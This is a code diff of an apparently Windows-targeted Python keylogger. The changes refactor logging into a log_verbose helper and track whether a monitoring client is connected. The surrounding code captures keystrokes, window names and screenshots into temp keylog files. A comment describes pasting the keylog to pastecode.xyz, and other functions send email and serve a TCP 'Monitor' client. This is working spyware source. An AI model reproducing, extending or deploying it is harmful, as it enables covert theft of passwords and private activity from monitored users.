@@ -125,8 +125,10 @@ threadLock = threading.Lock()
 threadList = []
 
 # TCP Server control
-# Cuando el servidor esta activo, tiene el valor True When Server is running this variable is True
-server_active = False
+# Cuando el servidor tiene un cliente activo tiene el valor True
+# When Server has a connected client this variable is True
+server_has_client = False               # Client connected ?
+client = None                           # This is a thread object of Client
 
 
 ########################################################
@@ -220,10 +222,14 @@ class ServerListenerThread(threading.Thread):
         tcpServer = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         tcpServer.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         tcpServer.bind((self.ip, self.port))
+        msg = APPNAME + " " + VERSION + " : Start server on "+str(self.ip)+" port "+str(self.port)
+        logging.info(msg)
+        if verbose >= 1:
+            print(msg)
 
         while True:
             tcpServer.listen(SERVER_MAX_CLIENTS)    # 5 clients are more than enough. Normally there is only 1 monitor.
-            msg = APPNAME + " " + VERSION + " : Waiting connection from Monitor..."
+            msg = "Waiting connection from Monitor..."
             logging.info(msg)
             if verbose >= 1:
                 print(msg)
@@ -236,6 +242,26 @@ class ServerListenerThread(threading.Thread):
 ########################################################
 # FUNCIONES - FUNCTIONS
 ########################################################
+
+# Funcion para generar mensajes de log y verbose en pantalla
+# log_level = logging.DEBUG, logging.INFO, logging.WARNING, logging.ERROR, logging.CRITICAL
+# verbose_level = 0, 1, 2, 3
+def log_verbose(msg, log_level, verbose_level):
+    if log_level == logging.DEBUG:
+        logging.debug(msg)
+    elif log_level == logging.INFO:
+        logging.info(msg)
+    elif log_level == logging.WARNING:
+        logging.warning(msg)
+    elif log_level == logging.ERROR:
+        logging.error(msg)
+    elif log_level == logging.CRITICAL:
+        logging.critical(msg)
+
+    if verbose >= verbose_level:
+        print(msg)
+    pass
+
 
 # función que hace "paste" del contenido del fichero de keylog
 # https://pastecode.xyz/api
@@ -280,9 +306,7 @@ def send_email(message):
 
     except Exception as ex:
         msg = 'No he podido enviar mensaje (' + ex + ')'
-        logging.error(msg)
-        if verbose >= 1:
-            print(msg)
+        log_verbose(msg,logging.ERROR,1)
 
     finally:
         server.quit()
@@ -325,10 +349,7 @@ def register_window_name(text):
     global key_buffer
     key_buffer += CRLF + CRLF + '[WINDOW NAME] ' + text + CRLF
     msg = 'Window Name '+text
-    logging.debug(msg)
-    if verbose >= 3:
-        print(msg)
-    return True
+    log_verbose(msg,logging.DEBUG,3)
 
 
 # Registra una captura de pantalla, añade el nombre al fichero de keylog y seguidamente inicia un thread para su
@@ -370,9 +391,7 @@ def delete_keylog_tempfile(pattern = None, logmsg = "Delete Temporal file"):
     folder_files = tempfile.gettempdir() + "\\" + pattern
     for file_remove in glob.glob(folder_files):
         msg = logmsg +" : " + file_remove
-        logging.info(msg)
-        if verbose >= 3:
-            print(msg)
+        log_verbose(msg,logging.INFO,3)
         os.remove(file_remove)
         count += 1
 
@@ -388,9 +407,7 @@ def create_keylog_file():
     prefix = KLGPRE + datetime.datetime.now().strftime("%y%m%d%H%M")
     ftemp, keylog_name = tempfile.mkstemp(KLGEXT, prefix)
     msg = 'Create keylogger file ' + keylog_name
-    logging.info(msg)
-    if verbose >= 2:
-        print(msg)
+    log_verbose(msg,logging.INFO,2)
     f = open(keylog_name, 'w+')
     f.close()
 
@@ -470,8 +487,6 @@ def on_mouse_event(event):
 
     old_event = event
 
-    return True
-
 
 # control eventos de teclado
 def on_keyboard_event(event):
@@ -493,9 +508,7 @@ def on_keyboard_event(event):
     # If especial key to close keylogger is pressed
     if event.Ascii == KEYCODE_EXIT:
         msg = 'Cerrando aplicación por combinación especial de tecla ' + repr(event.Ascii)
-        logging.info(msg)
-        if verbose >= 2:
-            print(msg)
+        log_verbose(msg,logging.INFO,2)
         key_buffer += CRLF + CRLF + "[" + msg + "]" + CRLF
         sys.exit(0)
 
